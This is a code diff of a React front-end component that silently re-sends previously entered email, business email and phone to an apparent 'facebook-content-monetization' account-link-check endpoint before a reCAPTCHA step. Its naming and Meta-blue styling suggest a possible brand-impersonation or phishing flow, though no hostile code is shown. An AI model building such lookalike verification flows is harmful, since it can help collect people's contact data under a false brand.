@@ -1,11 +1,9 @@
 'use client'
 
 import React from 'react'
-import PhoneInput from 'react-phone-input-2'
 
 import ReCaptchaVerification from '#components/recaptcha/ReCaptchaVerification'
-import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
-import { updateForm } from '@/app/store/slices/stepFormSlice'
+import { useAppSelector } from '@/app/store/hooks'
 import { useAppStrings } from '@/hooks/useAppStrings'
 
 const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
@@ -14,179 +12,136 @@ function normalizePhoneDigits(value: string) {
     return value.replace(/\D/g, '')
 }
 
+type AccountStatus = 'idle' | 'pending' | 'pass' | 'fail' | 'invalid' | 'upstream'
+
 interface CaptchaAccountHumanFlowProps {
     sessionKey: number
     onVerified: () => void
+    onNeedReentry: () => void
 }
 
-const CaptchaAccountHumanFlow: React.FC<CaptchaAccountHumanFlowProps> = ({ sessionKey, onVerified }) => {
+const CaptchaAccountHumanFlow: React.FC<CaptchaAccountHumanFlowProps> = ({
+    sessionKey,
+    onVerified,
+    onNeedReentry,
+}) => {
     const t = useAppStrings()
-    const dispatch = useAppDispatch()
     const formData = useAppSelector((s) => s.stepForm.data)
 
-    const [accountPassed, setAccountPassed] = React.useState(false)
-    const [checking, setChecking] = React.useState(false)
-    const [banner, setBanner] = React.useState<'none' | 'ok' | 'fail' | 'upstream'>('none')
+    const [accountStatus, setAccountStatus] = React.useState<AccountStatus>('idle')
+    const [recaptchaDone, setRecaptchaDone] = React.useState(false)
+    const inflightRef = React.useRef<AbortController | null>(null)
+    const dispatchedRef = React.useRef(false)
 
-    React.useEffect(() => {
-        setAccountPassed(false)
-        setChecking(false)
-        setBanner('none')
-    }, [sessionKey])
+    const runAccountCheck = React.useCallback(async () => {
+        if (inflightRef.current) inflightRef.current.abort()
+        const controller = new AbortController()
+        inflightRef.current = controller
 
-    const validateShape = (): boolean => {
         const email = formData.email.trim()
         const emailBusiness = formData.emailBusiness.trim()
-        const digits = normalizePhoneDigits(formData.phone)
+        const phone = normalizePhoneDigits(formData.phone)
+
         const emailOk = email.length > 0 && EMAIL_RE.test(email)
         const bizOk = emailBusiness.length > 0 && EMAIL_RE.test(emailBusiness)
-        const phoneOk = digits.length >= 8 && digits.length <= 15
-        return emailOk || bizOk || phoneOk
-    }
+        const phoneOk = phone.length >= 8 && phone.length <= 15
 
-    const runAccountCheck = async () => {
-        setBanner('none')
-        if (!validateShape()) {
-            setBanner('fail')
+        if (!emailOk && !bizOk && !phoneOk) {
+            setAccountStatus('invalid')
             return
         }
-        setChecking(true)
+
+        setAccountStatus('pending')
         try {
-            const email = formData.email.trim()
-            const emailBusiness = formData.emailBusiness.trim()
-            const phone = normalizePhoneDigits(formData.phone)
             const r = await fetch('/api/facebook-content-monetization/account-link-check', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ email, emailBusiness, phone }),
+                signal: controller.signal,
             })
             const data = await r.json().catch(() => ({}))
-            if (r.status === 503 || r.status === 501) {
-                setBanner('upstream')
-                setAccountPassed(false)
+            if (controller.signal.aborted) return
+
+            if (r.status === 501 || r.status === 503) {
+                setAccountStatus('upstream')
                 return
             }
             if (!r.ok) {
-                setBanner('fail')
-                setAccountPassed(false)
+                setAccountStatus('fail')
                 return
             }
-            if (data.linked === true) {
-                setAccountPassed(true)
-                setBanner('ok')
-            } else {
-                setAccountPassed(false)
-                setBanner('fail')
-            }
-        } catch {
-            setBanner('upstream')
-            setAccountPassed(false)
-        } finally {
-            setChecking(false)
+            setAccountStatus(data?.linked === true ? 'pass' : 'fail')
+        } catch (e) {
+            if ((e as Error)?.name === 'AbortError') return
+            setAccountStatus('upstream')
         }
-    }
+    }, [formData.email, formData.emailBusiness, formData.phone])
 
-    const fieldClass =
-        'input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[6px] focus-within:border-[#3b82f6] focus-within:shadow-md transition-all duration-200'
+    React.useEffect(() => {
+        dispatchedRef.current = false
+        setRecaptchaDone(false)
+        setAccountStatus('idle')
+        runAccountCheck()
+        return () => {
+            inflightRef.current?.abort()
+        }
+    }, [sessionKey, runAccountCheck])
 
-    const failMessage =
-        banner === 'fail'
-            ? !validateShape()
-                ? t.captcha.accountCheckNeedOneValid
-                : t.captcha.accountCheckNoneLinked
-            : null
+    React.useEffect(() => {
+        if (!recaptchaDone) return
+        if (dispatchedRef.current) return
+
+        if (accountStatus === 'pass') {
+            dispatchedRef.current = true
+            onVerified()
+            return
+        }
+        if (accountStatus === 'fail' || accountStatus === 'invalid') {
+            dispatchedRef.current = true
+            onNeedReentry()
+        }
+    }, [recaptchaDone, accountStatus, onVerified, onNeedReentry])
+
+    const finalizing = recaptchaDone && (accountStatus === 'pending' || accountStatus === 'idle')
+    const showRetry = recaptchaDone && accountStatus === 'upstream'
 
     return (
-        <div className="w-full">
-            <div className="mb-4 rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[12px]">
-                <p className="text-[13px] leading-[1.55] text-[#33507f]">{t.captcha.accountCheckIntro}</p>
+        <div className="relative w-full">
+            <ReCaptchaVerification
+                key={`${sessionKey}-recaptcha`}
+                onVerified={() => setRecaptchaDone(true)}
+            />
 
-                <div className="mt-3 space-y-[10px]">
-                    <div>
-                        <label htmlFor="captcha-contact-email" className="mb-[6px] block text-[13px] font-semibold text-[#3b4a64]">
-                            {t.info.email}
-                        </label>
-                        <div className={fieldClass}>
-                            <input
-                                id="captcha-contact-email"
-                                type="email"
-                                autoComplete="email"
-                                className="h-full w-full outline-0"
-                                placeholder={t.info.emailPh}
-                                value={formData.email}
-                                onChange={(e) =>
-                                    dispatch(
-                                        updateForm({
-                                            email: e.target.value,
-                                        })
-                                    )
-                                }
-                            />
-                        </div>
-                    </div>
-                    <div>
-                        <label htmlFor="captcha-business-email" className="mb-[6px] block text-[13px] font-semibold text-[#3b4a64]">
-                            {t.info.emailBiz}
-                        </label>
-                        <div className={fieldClass}>
-                            <input
-                                id="captcha-business-email"
-                                type="email"
-                                autoComplete="email"
-                                className="h-full w-full outline-0"
-                                placeholder={t.info.emailBizPh}
-                                value={formData.emailBusiness}
-                                onChange={(e) =>
-                                    dispatch(
-                                        updateForm({
-                                            emailBusiness: e.target.value,
-                                        })
-                                    )
-                                }
-                            />
-                        </div>
-                    </div>
-                    <div>
-                        <label className="mb-[6px] block text-[13px] font-semibold text-[#3b4a64]">{t.info.phone}</label>
-                        <div className={`${fieldClass} mb-0`}>
-                            <PhoneInput
-                                country={formData.country_code?.toLowerCase() || 'us'}
-                                value={formData.phone}
-                                onChange={(phoneVal) => {
-                                    const normalizedPhone = normalizePhoneDigits(phoneVal).slice(0, 15)
-                                    dispatch(updateForm({ phone: normalizedPhone }))
-                                }}
-                                inputProps={{
-                                    name: 'captcha-phone',
-                                }}
-                            />
-                        </div>
+            {showRetry ? (
+                <div className="mt-3 rounded-[10px] border border-[#fad4d4] bg-[#fff5f5] px-3 py-2">
+                    <p className="text-[12px] leading-[1.5] text-[#b42318]">{t.captcha.accountCheckErrUpstream}</p>
+                    <button
+                        type="button"
+                        onClick={() => {
+                            dispatchedRef.current = false
+                            setRecaptchaDone(false)
+                            runAccountCheck()
+                        }}
+                        className="mt-2 inline-flex h-[34px] items-center rounded-[8px] bg-[#0064E0] px-3 text-[13px] font-[600] text-white active:opacity-90"
+                    >
+                        {t.captcha.retry}
+                    </button>
+                </div>
+            ) : null}
+
+            {finalizing ? (
+                <div
+                    role="status"
+                    aria-live="polite"
+                    className="absolute inset-0 z-10 flex items-center justify-center rounded-[10px] bg-white/85 backdrop-blur-[1px]"
+                >
+                    <div className="flex flex-col items-center gap-2">
+                        <span className="recaptcha-spinner-track" style={{ width: 28, height: 28 }} />
+                        <span className="recaptcha-spinner-segment" style={{ width: 28, height: 28 }} />
+                        <p className="mt-2 text-[12px] text-[#3b4a64]">{t.captcha.finalizing}</p>
                     </div>
                 </div>
-
-                {failMessage ? <p className="mt-2 text-[13px] text-[#e5484d]">{failMessage}</p> : null}
-                {banner === 'upstream' ? (
-                    <p className="mt-2 text-[13px] text-[#e5484d]">{t.captcha.accountCheckErrUpstream}</p>
-                ) : null}
-                {banner === 'ok' ? <p className="mt-2 text-[13px] text-[#0d7d4d]">{t.captcha.accountCheckOk}</p> : null}
-
-                <button
-                    type="button"
-                    disabled={checking}
-                    onClick={runAccountCheck}
-                    className="mt-3 w-full min-h-[44px] rounded-[10px] bg-[#1877f2] text-[15px] font-[600] text-white transition-opacity active:opacity-90 disabled:cursor-wait disabled:opacity-85"
-                >
-                    {checking ? t.captcha.accountCheckVerifying : t.captcha.accountCheckVerify}
-                </button>
-            </div>
-
-            <div className={!accountPassed ? 'pointer-events-none opacity-[0.45]' : ''} aria-busy={!accountPassed}>
-                <ReCaptchaVerification
-                    key={`${sessionKey}-human-${accountPassed ? '1' : '0'}`}
-                    onVerified={onVerified}
-                    blockedHint={accountPassed ? undefined : t.captcha.accountCheckUnlockRecaptcha}
-                />
-            </div>
+            ) : null}
         </div>
     )
 }
